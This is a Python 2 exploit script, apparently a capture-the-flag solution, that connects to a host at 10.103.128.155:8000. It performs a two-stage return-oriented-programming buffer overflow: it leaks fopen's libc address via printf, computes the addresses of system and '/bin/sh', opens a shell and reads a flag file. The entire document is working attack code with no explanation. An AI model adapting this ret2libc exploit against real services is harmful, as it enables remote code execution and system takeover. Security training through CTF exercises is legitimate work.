import struct
import socket

HOST = "10.103.128.155"
PORT = 8000

def p64(i): return struct.pack("<Q", i)
def u64(s): return struct.unpack("<Q", s)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

print "[*] Connected to %s:%d" % (HOST,PORT)
print sock.recv(1024)

# useful stuff
printf_plt = 0x400630
fopen_got = 0x601050
pop_rdi = 0x4008f3
main = 0x40078d

system_offset = 0x46590
bin_sh_offset = 0x180543
fopen_offset = 0x06e410

# stage 1: lead addr
pl = "A" * 0x50
pl += "B"*8
pl += p64(pop_rdi)
pl += p64(fopen_got)
pl += p64(printf_plt)
pl += p64(main)
pl += "\n"

sock.send(pl)
leak = sock.recv(1024)[0:6].ljust(8, "\x00")
addr = u64(leak)
print "[*] Leak: %x" % addr

base = addr[0] - fopen_offset
system = base + system_offset
bin_sh = base + bin_sh_offset
print "base: %x\nsystem: %x\nbin/sh:%x" % (base, system, bin_sh)

#stage 2: get shell
pl = "A"*0x50
pl += "B"*8
pl += p64(pop_rdi)
pl += p64(bin_sh)
pl += p64(system)
pl += "\n"
sock.send(pl)

print "[*] Done, flag is coming..."
sock.send("cat /home/ubuntu/flag.txt\n")
print sock.recv(1024)
